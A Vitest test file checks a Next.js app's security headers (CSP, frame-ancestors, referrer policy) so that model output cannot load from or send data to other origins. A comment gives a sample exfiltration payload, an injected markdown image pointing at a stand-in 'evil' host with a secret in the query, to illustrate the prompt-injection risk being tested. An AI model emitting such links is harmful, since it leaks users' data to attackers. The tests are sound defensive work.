import { describe, expect, it } from 'vitest';
import nextConfig from './next.config';

/** Security headers sent on every route, keyed by lowercase name. */
async function headers(): Promise<Record<string, string>> {
  const rules = (await nextConfig.headers?.()) ?? [];
  const all = rules.find((r) => r.source === '/(.*)');
  return Object.fromEntries((all?.headers ?? []).map((h) => [h.key.toLowerCase(), h.value]));
}

/** CSP directives as { name: sources[] }. */
async function csp(): Promise<Record<string, string[]>> {
  const policy = (await headers())['content-security-policy'] ?? '';
  return Object.fromEntries(
    policy.split(';').map((d) => d.trim().split(/\s+/)).filter((parts) => parts[0]).map(([name, ...sources]) => [name, sources]),
  );
}

describe('security headers', () => {
  it('keeps model output from loading or sending data to other origins', async () => {
    const policy = await csp();
    expect(policy['default-src']).toEqual(["'self'"]);
    // Remote images are the classic exfiltration channel for injected markdown (![x](https://evil/?d=secret)).
    for (const source of policy['img-src']) expect(source).toMatch(/^('self'|blob:|data:)$/);
    expect(policy['connect-src']).toBeUndefined(); // falls back to default-src 'self'
    expect(policy['object-src']).toEqual(["'none'"]);
    expect(policy['form-action']).toEqual(["'self'"]);
    expect(policy['script-src']).not.toContain("'unsafe-eval'"); // only added under `next dev`
  });

  it('blocks framing (clickjacking the memory Approve button) and referrer leaks', async () => {
    const h = await headers();
    expect((await csp())['frame-ancestors']).toEqual(["'none'"]);
    expect(h['x-frame-options']).toBe('DENY');
    expect(h['referrer-policy']).toBe('no-referrer');
    expect(h['x-content-type-options']).toBe('nosniff');
  });
});
